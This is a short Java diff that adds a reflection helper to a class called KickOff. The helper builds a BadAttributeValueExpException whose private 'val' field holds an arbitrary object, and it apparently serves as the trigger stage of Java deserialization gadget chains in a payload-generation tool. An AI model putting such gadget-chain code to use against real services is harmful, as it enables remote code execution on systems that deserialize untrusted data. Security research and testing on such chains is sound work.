@@ -2,6 +2,7 @@ package com.ppp;
 
 import com.ppp.utils.Reflections;
 
+import javax.management.BadAttributeValueExpException;
 import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
@@ -12,6 +13,8 @@ import java.util.Map;
 public class KickOff {
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
+    public static final String BAD_ATT_EXCEPTION_CLASS = "javax.management.BadAttributeValueExpException";
+
 
     /**
      * sun.reflect.annotation.AnnotationInvocationHandler
@@ -19,6 +22,15 @@ public class KickOff {
     public static InvocationHandler annotationInvocationHandler(final Map map) throws Exception {
         final InvocationHandler handler = annotationInvocationHandler(map, Override.class);
         return handler;
+    }
+
+    /**
+     * javax.management.BadAttributeValueExpException
+     */
+    public static BadAttributeValueExpException badAttributeValueExpException(final Object val) throws Exception {
+        BadAttributeValueExpException badAttributeValueExpException = (BadAttributeValueExpException) Reflections.getFirstCtor(BAD_ATT_EXCEPTION_CLASS).newInstance((Object) null);
+        Reflections.setFieldValue(badAttributeValueExpException, "val", val);
+        return badAttributeValueExpException;
     }
 
     public static InvocationHandler annotationInvocationHandler(final Map map, final Class ifaces) throws Exception {
